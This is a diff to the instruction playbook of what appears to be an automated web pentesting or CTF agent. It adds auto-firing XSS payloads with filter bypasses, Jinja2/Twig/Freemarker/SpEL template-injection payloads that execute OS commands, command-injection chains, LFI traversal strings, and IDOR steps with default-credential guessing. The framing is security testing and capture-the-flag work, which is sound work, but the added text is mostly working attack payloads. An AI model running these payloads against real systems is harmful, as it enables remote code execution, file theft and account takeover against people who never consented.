@@ -1006,23 +1006,45 @@ requests.packages.urllib3.disable_warnings()
 target_url = "https://TARGET/page"
 param_name = "PARAM"
 
-# --- XSS: Only test if parameter is REFLECTED ---
+# --- XSS: test reflection AND execution. Prefer AUTO-FIRING vectors (no click
+# needed) so they also execute in a server-side/headless checker. If 'alert' is
+# filtered, confirm()/prompt() trigger the SAME dialog (and so do obfuscated
+# forms). If the challenge/app demands a specific string (e.g. alert('XSS')),
+# put THAT exact string (right case) as MARK — many apps run your payload in a
+# headless browser and return a success/flag string IN THE SAME RESPONSE when a
+# dialog fires, so read the response for it (no external exfil needed).
+MARK = "XSS1337"  # for a CTF, set MARK to the EXACT string the task requires (e.g. XSS)
 xss_payloads = [
-    '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
-    '"><script>alert(1)</script>', "'-alert(1)-'",
-    '<svg/onload=alert(1)>', '<details/open/ontoggle=alert(1)>',
-    '{{7*7}}', '${alert(1)}'
+    f"<img src=x onerror=alert('{MARK}')>", f"<img src=x onerror=confirm('{MARK}')>",
+    f"<svg onload=alert('{MARK}')>", f"<svg onload=prompt('{MARK}')>",
+    f"<body onload=alert('{MARK}')>", f"<input autofocus onfocus=alert('{MARK}')>",
+    f"<details open ontoggle=alert('{MARK}')>", f"<video><source onerror=alert('{MARK}')>",
+    f"<iframe src=x onerror=confirm('{MARK}')>", f"<marquee onstart=alert('{MARK}')>",
+    f"<script>alert('{MARK}')</script>",
+    f"\"><img src=x onerror=confirm('{MARK}')>", f"'><svg onload=confirm('{MARK}')>",
+    f"\" autofocus onfocus=alert('{MARK}') x=\"",   # attribute-context breakout
+    f"<img src=x onerror=window['al'+'ert']('{MARK}')>",  # bypass when 'alert' blocked
+    '{{7*7}}', '${7*7}',
 ]
+oracle = ["flag{", "congratulation", "correct!", "success", "well done", "you did it"]
 for p in xss_payloads:
     try:
         r = requests.get(f"{target_url}?{param_name}={urllib.parse.quote(p)}",
                         verify=False, timeout=10)
-        # Check if payload appears UNENCODED in response
+        low = r.text.lower()
+        if any(o in low for o in oracle):
+            print(f"[XSS EXECUTED — success/flag oracle in response] payload: {p}")
+            print(r.text[:500]); break
         if p in r.text or (p == '{{7*7}}' and '49' in r.text):
             print(f"[POTENTIAL XSS] Payload reflected unencoded: {p}")
             print(f"  Status: {r.status_code}, Content-Type: {r.headers.get('Content-Type')}")
     except Exception as e:
         print(f"Error: {e}")
+# If a payload fired but the app says the WRONG string (e.g. "you used 1 instead
+# of XSS"), re-fire with the EXACT required string. If nothing fires in a
+# headless checker, switch vector (img onerror -> svg onload -> autofocus onfocus
+# -> details ontoggle) and match the injection CONTEXT — do NOT abandon a known
+# XSS challenge for recon/dirbusting.
 
 # --- SQLi: Only test if single quote caused errors ---
 sqli_payloads = [
@@ -1046,6 +1068,13 @@ for payload, sqli_type in sqli_payloads:
     except Exception as e:
         print(f"Error: {e}")
 ` + "`" + `
+
+#### Capturing a flag (CTF): once you have code-exec or file-read, READ THE FLAG
+Detecting the class is NOT the win — you must retrieve the flag. Flags live in a file or env: /flag, /flag.txt, /opt/flag.txt, /tmp/flag*, /var/www/flag*, the app directory, or an env var (printenv | grep -i flag). Read the challenge hint for the exact path, then pivot your primitive to read it:
+- **SSTI (Jinja2) -> RCE -> read the flag.** After {{7*7}} returns 49, escalate: {{cycler.__init__.__globals__.os.popen('cat /flag').read()}} · {{lipsum.__globals__.os.popen('cat /opt/flag.txt').read()}} · {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}} · {{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}} · {{config}} / {{config.items()}} (often holds secrets/flag). If characters/words are FILTERED (dots, underscores, quotes, or the words os/popen/class blocked), bypass with attribute filters and indexing: {{()|attr('__class__')}}, {{request['application']}}, {{request|attr(['__cl','ass__']|join)}}, hex/unicode escapes (\x5f = _), and building strings from request.args. Other engines: Twig {{['id']|filter('system')}}; Freemarker <#assign x="freemarker.template.utility.Execute"?new()>${x("cat /flag")}; SpEL ${T(java.lang.Runtime).getRuntime().exec("cat /flag")}.
+- **Command injection -> read the flag.** Chain with ; | && $() backticks or a %0a newline, then cat the flag: ;cat /flag · |cat /opt/flag.txt · $(cat /tmp/flag*). BLIND (no output)? redirect to a readable web path (; cat /flag > /var/www/html/x.txt then GET /x.txt), confirm with time (; sleep 5), or exfil via verify_oob callback. Metachars filtered? use newline %0a, ${IFS} for spaces, and try each of ; | & separately.
+- **LFI / path traversal -> read the flag file directly:** ?file=../../../../flag , PHP wrapper php://filter/convert.base64-encode/resource=../../../flag (then base64 -d), and try the hinted path with enough ../ to reach root.
+- Do NOT stop at a proof-of-concept (49, uid=0, a reflected value) and do NOT drift to unrelated recon — immediately reuse the SAME primitive to read the flag file, then report the exact flag string.
 
 #### Step 6C: Confirm with a one-call verifier FIRST — scanners are only a fallback
 **The moment a parameter shows a class signal in Steps 6A/6B, call the matching deterministic verifier before reaching for a scanner:** verify_sqli (a provoked SQL error), verify_ssti (a {{a*b}} that returns its product), verify_xss (a nonce that actually executes — pass data=<urlencoded body> for a POST parameter), verify_xxe (an XML endpoint that expands a SYSTEM file:// entity), verify_csrf (a state change accepted from a forged cross-site origin with no token). Each is a single call, records exploit-proven ledger evidence, and lets you report the very next turn. **Use sqlmap/dalfox ONLY as the fallback when a verifier cannot confirm, and ONLY on parameters that showed indicators in Steps 6A/6B** — never blindly across all URLs.
@@ -1126,6 +1155,7 @@ for param in ssrf_params:
 
 ### PHASE 8: IDOR & Broken Access Control
 - **CONFIRM with authz_matrix FIRST.** The moment you find an object-id parameter (e.g. /api/orders/1042), a numeric/UUID resource id, or ANY authenticated endpoint, call authz_matrix url=<that resource> — it replays your exact request as a SECOND account (if one is configured) and as anonymous, then records the cross-identity access differential as exploit-proven ledger evidence you can report the very next turn. A lower identity getting the SAME successful response as the authorized one = broken object-level authorization (BOLA/IDOR); anonymous reaching a protected resource = auth bypass/BFLA. Do NOT hand-roll multi-account curl comparisons when authz_matrix confirms it in one call, and report as CWE-639 using that differential as proof.
+- **To CAPTURE A FLAG via IDOR (CTF): confirming the access differential is NOT enough — you must READ the target object.** First authenticate (try default creds admin/admin, admin/password, test/test, guest/guest, or REGISTER your own account), then walk object/user IDs and read each response for the flag or sensitive data: start at **id=1 (the FIRST/earliest record is usually the admin / flag holder)**, then 0, 2, 3, and the neighbors of your OWN id. If ids are UUIDs, register several accounts to reveal the allocation pattern. The flag typically lives in ANOTHER user's / the first user's / the admin's object, and the effect of tampering an id may surface on a DIFFERENT page — re-check related endpoints (profile, dashboard, receipt, messages) after each change. Keep enumerating until you find it; do NOT pivot to XSS, cookie/secret brute-forcing, or dirbusting on a challenge whose objective is clearly IDOR / id-tampering.
 - Test all authenticated endpoints with different user IDs
 - Increment/decrement numeric IDs: /api/user/1, /api/user/2, /api/user/0
 - Test UUID prediction and enumeration
